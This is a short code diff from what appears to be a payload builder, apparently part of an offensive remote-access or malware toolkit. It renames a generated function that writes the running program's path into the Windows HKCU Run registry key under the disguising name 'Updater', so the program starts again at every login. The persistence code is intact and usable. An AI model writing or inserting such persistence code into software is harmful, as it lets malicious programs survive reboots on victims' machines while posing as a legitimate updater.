@@ -9,9 +9,9 @@ def main(option):
         config.import_statements.append('import _winreg')
         config.import_statements.append('from sys import argv')
         config.import_statements.append('from os import getcwd, path')
-        config.startup.append('registry_persist(path.join(getcwd(),path.abspath(argv[0])))')
+        config.startup.append('registry_persist_startup(path.join(getcwd(),path.abspath(argv[0])))')
         config.functions.append('''
-def registry_persist(path):
+def registry_persist_startup(path):
     reg = _winreg.ConnectRegistry(None,_winreg.HKEY_CURRENT_USER)
     key = _winreg.CreateKeyEx(reg,'Software\\Microsoft\\Windows\\CurrentVersion\\Run',0,_winreg.KEY_WRITE)
     _winreg.SetValueEx(key, 'Updater',0,_winreg.REG_SZ, path)
